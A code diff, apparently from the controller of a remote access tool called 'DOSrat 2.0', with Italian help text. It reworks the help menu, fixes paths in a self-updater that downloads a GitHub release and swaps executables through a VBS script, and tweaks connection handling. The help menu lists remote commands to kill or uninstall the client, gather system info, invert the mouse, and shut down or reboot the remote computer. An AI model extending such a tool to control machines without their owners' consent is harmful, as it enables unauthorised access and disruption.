@@ -42,25 +42,54 @@ void StampaPrefix(string NomeClient = "")
     cout << "> ";
 }
 
+void StampaHelp(string Cmd, string Desc)
+{
+    ConsoleUtils cu;
+    COORD Cpos;
+    COORD Csize = cu.GetConsoleSize();
+
+    cout << Cmd;
+
+    Cpos = cu.GetCursorPos();
+
+    if (Desc.size() < Csize.X - Cpos.X)
+    {
+        cout << Desc << endl;
+        return;
+    }
+
+    for (int i = 0; i < Desc.size(); i++)
+    {
+        if (cu.GetCursorPos().X == Csize.X - 1)
+        {
+            cout << endl;
+            Cpos.Y++;
+            cu.SetCursorPos({ Cpos.X, Cpos.Y });
+        }
+
+        cout << Desc[i];
+    }
+
+    cout << endl;
+}
+
 bool AutoAggiornamento()
 {
     GitHub gh;
     DirUtils du;
     SystemUtils su;
 
-    du.SetCurrDir(du.GetModuleFilePath());
+    if (!du.CheckDir(du.GetModuleFilePath() + "Update"))
+        du.MakeDir(du.GetModuleFilePath() + "Update");
 
-    if (!du.CheckDir("Update"))
-        du.MakeDir("Update");
-
-    if (!gh.DownloadFromRepoRelease("criper98", "dosrat-2.0", "DOSrat2.0.zip", "Update\\"))
+    if (!gh.DownloadFromRepoRelease("criper98", "dosrat-2.0", "DOSrat2.0.zip", du.GetModuleFilePath() + "Update\\"))
         return false;
 
-    su.NoOutputCMD("PowerShell Expand-Archive Update\\DOSrat2.0.zip 'Update' -force");
+    su.NoOutputCMD("PowerShell Expand-Archive '" + du.GetModuleFilePath() + "Update\\DOSrat2.0.zip' '" + du.GetModuleFilePath() + "Update' -force");
 
-    du.DelFile("Update\\DOSrat2.0.zip");
+    du.DelFile(du.GetModuleFilePath() + "Update\\DOSrat2.0.zip");
 
-    if(!du.WriteFile("Update.vbs", "WScript.Sleep 2500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"DOSrat 2.0.exe\"\nfilesys.DeleteFile \"Build\\Client.exe\"\nfilesys.MoveFile \"Update\\DOSrat 2.0.exe\", \"DOSrat 2.0.exe\"\nfilesys.MoveFile \"Update\\Build\\Client.exe\", \"Build\\Client.exe\"\nWshShell.Run \"DOSrat 2.0.exe\", 1, false\nfilesys.DeleteFile \"Update.vbs\""))
+    if(!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 2500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\DOSrat 2.0.exe\", \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\Build\\Client.exe\", \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nWshShell.Run \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\", 1, false\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
         return false;
 
     su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");
@@ -109,7 +138,7 @@ void AccettaConnessioni(TcpIP& Server)
             }
         }
 
-        if (Server.WaitConn(Clients[c].sock, 1000))
+        if (Server.WaitConn(Clients[c].sock))
             COMUNICAZIONI::Inizializzazione(c, Clients[c].sock);
     }
 
@@ -120,6 +149,8 @@ void VerificaConnessioni()
 {
     while (true)
     {
+        Sleep(1);
+
         if (!ServerLoopController)
             break;
 
@@ -426,23 +457,26 @@ void Sessione(int ID, SOCKET Sock)
 
         if (cmd == "help")
         {
-            cout << "\t\tClient" << endl;
-            cout << "Reconnect - Forza il Client a scollegarsi e ricollegarsi a DOSrat ma senza riavviarlo." << endl;
-            cout << "Killclient / Kill - Termina il processo del Client." << endl;
-            cout << "Updateclient / Update - Aggiorna il Client scegliendo l'eseguibile tra i file locali, il Client si riavviera' con il file scelto." << endl;
-            cout << "Uninstall - Disinstalla il Client dal computer remoto." << endl;
-            cout << "Restartclient / Restart - Riavvia il Client terminando il processo e riavviandolo." << endl;
             cout << endl;
-            cout << "\t\tSystem" << endl;
-            cout << "Getinfo - Ottieni informazioni sul computer remoto e sul Client." << endl;
-            cout << "Invertmouse - Inverte i tasti del mouse sul computer remoto." << endl;
-            cout << "Shutdown - Spegne il computer remoto." << endl;
-            cout << "Reboot - Riavvia il computer remoto." << endl;
+            cli.SubTitle("Client", 20, tc.Blue);
+            StampaHelp("Reconnect\t\t", "- Forza il Client a scollegarsi e ricollegarsi a DOSrat ma senza riavviarlo.");
+            StampaHelp("Killclient / Kill\t", "- Termina il processo del Client.");
+            StampaHelp("Updateclient / Update\t", "- Aggiorna il Client scegliendo l'eseguibile tra i file locali, il Client si riavviera' con il file scelto.");
+            StampaHelp("Uninstall\t\t", "- Disinstalla il Client dal computer remoto.");
+            StampaHelp("Restartclient / Restart\t", "- Riavvia il Client terminando il processo e riavviandolo.");
             cout << endl;
-            cout << "\t\tUtility" << endl;
-            cout << "Exit / Close - Torna al menu principale." << endl;
-            cout << "Clear / Cls - Pulisce la console da tutti i comandi precedenti." << endl;
-            cout << "Help - Mostra la lista dei comandi." << endl;
+
+            cli.SubTitle("System", 20, tc.Lime);
+            StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul computer remoto e sul Client.");
+            StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse sul computer remoto.");
+            StampaHelp("Shutdown\t", "- Spegne il computer remoto.");
+            StampaHelp("Reboot\t\t", "- Riavvia il computer remoto.");
+            cout << endl;
+
+            cli.SubTitle("Utility", 20, tc.Purple);
+            StampaHelp("Exit / Close\t", "- Torna al menu principale.");
+            StampaHelp("Clear / Cls\t", "- Pulisce la console da tutti i comandi precedenti.");
+            StampaHelp("Help\t\t", "- Mostra la lista dei comandi.");
             cout << endl;
         }
         else if (cmd == "getinfo")
